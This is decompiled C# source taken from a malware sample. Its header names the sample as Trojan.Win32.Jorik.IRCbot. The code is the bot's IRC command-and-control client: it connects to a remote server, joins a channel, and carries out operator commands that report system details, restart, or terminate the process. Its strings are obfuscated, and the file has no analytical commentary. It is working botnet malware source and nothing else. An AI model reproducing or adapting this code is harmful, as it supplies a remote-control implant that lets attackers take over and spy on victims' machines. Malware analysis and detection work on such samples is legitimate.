// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A6501CE-651B-49EF-9CD4-6837233ABDB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Jorik.IRCbot.div-738c3979666da85c3c9872a05697e6bff01b107645b92c3a808be0f2a7bf41a4.exe

using \u0003;
using \u0005;
using \u007F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u007F
{
  internal class \u001F
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    public static string \u0001;
    public static int \u0002;
    public static string \u0003;
    public static string \u0004;
    public static string \u0005;
    public static string \u0006;
    public static StreamWriter \u0007;
    private bool \u0008;

    static \u001F()
    {
      \u0004.\u008E();
      \u001F.\u0001 = \u001F.\u0001(119);
      \u001F.\u0002 = 0;
      \u001F.\u0003 = \u001F.\u0001(119);
      \u001F.\u0004 = \u001F.\u0001(119);
      \u001F.\u0005 = \u001F.\u0001(119);
      \u001F.\u0006 = \u001F.\u0001(119);
    }

    public \u001F() => this.\u0008 = false;

    public void \u0094(string Host, int server_Port, string bot_Channel, string Cpass = "")
    {
      string str = \u0086.\u0007\u0002(5, 0, 1);
      \u001F.\u0001 = Host;
      \u001F.\u0002 = server_Port;
      \u001F.\u0003 = \u0080\u0003.\u008C\u0002(\u0086.\u0007\u0002(5, 0, 1), \u001F.\u0001(120), \u0087.\u0008\u0002(), \u001F.\u0001(125));
      \u001F.\u0005 = bot_Channel;
      \u001F.\u0006 = Cpass;
      \u001F.\u0004 = \u0080\u0003.\u008C\u0002(\u001F.\u0001(130), \u001F.\u0003, \u001F.\u0001(139), str);
      \u0086.\u0005\u0002(\u001F.\u0001(156));
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void \u0095()
    {
      string str1 = \u001F.\u0001(119);
      string str2 = \u001F.\u0001(119);
      string str3 = \u001F.\u0001(119);
      try
      {
        TcpClient tcpClient = new TcpClient(\u001F.\u0001, \u001F.\u0002);
        NetworkStream networkStream = \u0015\u0002.\u007E\u0094\u0004((object) tcpClient);
        StreamReader streamReader = new StreamReader((Stream) networkStream);
        \u001F.\u0007 = new StreamWriter((Stream) networkStream);
        while (true)
        {
          while (\u001F.\u0098<string>(ref str1, \u0086\u0002.\u007E\u001A\u0004((object) streamReader)) != null)
          {
            \u0086.\u0005\u0002(\u008B\u0003.\u008A\u0002(\u001F.\u0001(177), str1));
            if (\u0081\u0002.\u007E\u0087\u0002((object) str1, \u001F.\u0001(186)))
            {
              string[] strArray = \u0086\u0003.\u009E(str1, \u001F.\u0001(195), -1, CompareMethod.Binary);
              this.\u0096(\u008B\u0003.\u008A\u0002(\u001F.\u0001(200), strArray[1]));
            }
            if (!this.\u0008)
            {
              this.\u0096(\u008B\u0003.\u008A\u0002(\u001F.\u0001(209), \u001F.\u0003));
              this.\u0096(\u001F.\u0004);
              \u0086.\u0005\u0002(\u001F.\u0001(218));
              this.\u0008 = true;
            }
            if (\u0086.\u0006\u0002(str1))
            {
              if (\u0008\u0002.\u009B(\u001F.\u0006) > 0)
              {
                this.\u0096(\u0080\u0003.\u008C\u0002(\u001F.\u0001(239), \u001F.\u0005, \u001F.\u0001(248), \u001F.\u0006));
                \u0086.\u0005\u0002(\u001F.\u0001(253));
              }
              else
              {
                this.\u0096(\u008B\u0003.\u008A\u0002(\u001F.\u0001(239), \u001F.\u0005));
                \u0086.\u0005\u0002(\u001F.\u0001(253));
              }
            }
            if (\u0086.\u0001\u0002(\u008C.\u0001, str1))
            {
              if (\u0081\u0002.\u007E\u0087\u0002((object) str1, \u001F.\u0001(270)))
              {
                try
                {
                  string[] strArray = new string[7]
                  {
                    \u001F.\u0001(279),
                    \u0087.\u0008\u0002(),
                    \u001F.\u0001(248),
                    \u009E\u0002.\u0001\u0002(\u008C.\u0004),
                    \u001F.\u0001(292),
                    \u008D.\u0017\u0002(\u001F.\u0001(297), \u001F.\u0001(386)),
                    \u001F.\u0001(411)
                  };
                  string str4 = \u007F\u0003.\u008D\u0002(strArray);
                  this.\u0097(\u0089\u0003.\u008B\u0002(\u001F.\u0001(416), str4, \u001F.\u0001(125)));
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Exception exception = ex;
                  this.\u0097(\u008B\u0003.\u008A\u0002(\u001F.\u0001(425), \u0086\u0002.\u007E\u0093\u0002((object) exception)));
                  \u0012\u0003.\u0090();
                }
              }
              if (\u0081\u0002.\u007E\u0087\u0002((object) str1, \u001F.\u0001(438)))
              {
                try
                {
                  \u0089.\u0010\u0002(\u001F.\u0001(455), true);
                  this.\u0096(\u001F.\u0001(472));
                  \u0012\u0003.\u0091();
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Exception exception = ex;
                  this.\u0097(\u008B\u0003.\u008A\u0002(\u001F.\u0001(425), \u0086\u0002.\u007E\u0093\u0002((object) exception)));
                  \u0012\u0003.\u0090();
                }
              }
              if (\u0081\u0002.\u007E\u0087\u0002((object) str1, \u001F.\u0001(489)))
              {
                try
                {
                  this.\u0096(\u001F.\u0001(472));
                  \u0012\u0003.\u0091();
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Exception exception = ex;
                  this.\u0097(\u008B\u0003.\u008A\u0002(\u001F.\u0001(425), \u0086\u0002.\u007E\u0093\u0002((object) exception)));
                  \u0012\u0003.\u0090();
                }
              }
              if (\u0081\u0002.\u007E\u0087\u0002((object) str1, \u001F.\u0001(498)))
              {
                try
                {
                  string str5 = \u0089\u0002.\u0087(\u0083.\u009C(true));
                  string str6 = \u0089\u0002.\u0087(\u0083.\u009B(true));
                  bool flag = \u0081.\u0099();
                  string[] strArray = new string[7]
                  {
                    \u001F.\u0001(515),
                    str5,
                    \u001F.\u0001(544),
                    \u009C\u0002.\u0084(flag),
                    \u001F.\u0001(553),
                    str6,
                    \u001F.\u0001(125)
                  };
                  this.\u0097(\u007F\u0003.\u008D\u0002(strArray));
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Exception exception = ex;
                  this.\u0097(\u008B\u0003.\u008A\u0002(\u001F.\u0001(425), \u0086\u0002.\u007E\u0093\u0002((object) exception)));
                  \u0012\u0003.\u0090();
                }
              }
              if (\u0081\u0002.\u007E\u0087\u0002((object) str1, \u001F.\u0001(566)))
              {
                try
                {
                  if (\u0086.\u0002\u0002(str1))
                    this.\u0097(\u001F.\u0001(571));
                  else
                    this.\u0097(\u001F.\u0001(596));
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Exception exception = ex;
                  this.\u0097(\u008B\u0003.\u008A\u0002(\u001F.\u0001(425), \u0086\u0002.\u007E\u0093\u0002((object) exception)));
                  \u0012\u0003.\u0090();
                }
              }
              if (\u0081\u0002.\u007E\u0087\u0002((object) str1, \u001F.\u0001(617)))
              {
                try
                {
                  if (\u0086.\u0004\u0002(str1))
                    this.\u0097(\u001F.\u0001(626));
                  else
                    this.\u0097(\u001F.\u0001(647));
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Exception exception = ex;
                  this.\u0097(\u008B\u0003.\u008A\u0002(\u001F.\u0001(425), \u0086\u0002.\u007E\u0093\u0002((object) exception)));
                  \u0012\u0003.\u0090();
                }
              }
            }
          }
          \u0011\u0002.\u007E\u001D\u0004((object) \u001F.\u0007);
          \u0011\u0002.\u007E\u0019\u0004((object) streamReader);
          \u0011\u0002.\u007E\u0095\u0004((object) tcpClient);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        \u0086.\u0005\u0002(\u008B\u0003.\u008A\u0002(\u001F.\u0001(668), \u0086\u0002.\u007E\u0093\u0002((object) exception)));
        this.\u0008 = false;
        \u0012\u0002.\u001B\u0003(5000);
        this.\u0095();
        \u0012\u0003.\u0090();
      }
    }

    private void \u0096([In] string obj0)
    {
      \u0080\u0002.\u007E\u001B\u0004((object) \u001F.\u0007, obj0);
      \u0011\u0002.\u007E\u001E\u0004((object) \u001F.\u0007);
      \u0086.\u0005\u0002(\u008B\u0003.\u008A\u0002(\u001F.\u0001(685), obj0));
    }

    private void \u0097([In] string obj0)
    {
      \u0080\u0002.\u007E\u001B\u0004((object) \u001F.\u0007, \u0080\u0003.\u008C\u0002(\u001F.\u0001(694), \u001F.\u0005, \u001F.\u0001(707), obj0));
      \u0011\u0002.\u007E\u001E\u0004((object) \u001F.\u0007);
      \u0086.\u0005\u0002(\u008B\u0003.\u008A\u0002(\u001F.\u0001(685), obj0));
    }

    private static T \u0098<T>([In] ref T obj0, [In] T obj1)
    {
      obj0 = obj1;
      return obj1;
    }
  }
}
